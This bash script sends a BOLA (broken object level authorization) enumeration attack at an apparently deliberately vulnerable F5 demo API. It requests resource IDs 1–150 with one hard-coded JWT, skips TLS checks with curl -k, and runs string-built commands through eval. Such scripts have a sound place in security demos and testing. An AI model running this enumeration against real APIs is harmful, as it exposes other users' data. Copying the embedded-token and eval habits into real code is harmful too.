#!/bin/bash

# Bola VulnarableAPI endpoint
BASE_URL='https://api-sentence.emea-ent.f5demos.com/api/animals/'

# JWT token
BEARER_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Illhc3NlciBFbG1hc2hhZCIsImlhdCI6MTUxNjIzOTAyMn0.Scd70M30q5hw86md0eXjCWWWJ4H_sr7sqvvV3A4i1UM'

# Generate 150 dynamic resource_ids using a loop
for i in {1..150}
do
RESOURCE_ID="$(printf $i)"

# Send traffic for each resource_id with the same JWT
COMMAND="curl -k -H 'Authorization: Bearer $BEARER_TOKEN' '${BASE_URL}${RESOURCE_ID}'"
echo "---------------------------------------------------------------------------------------------------------"
echo $COMMAND
echo "---------------------------------------------------------------------------------------------------------"
eval $COMMAND
echo
done
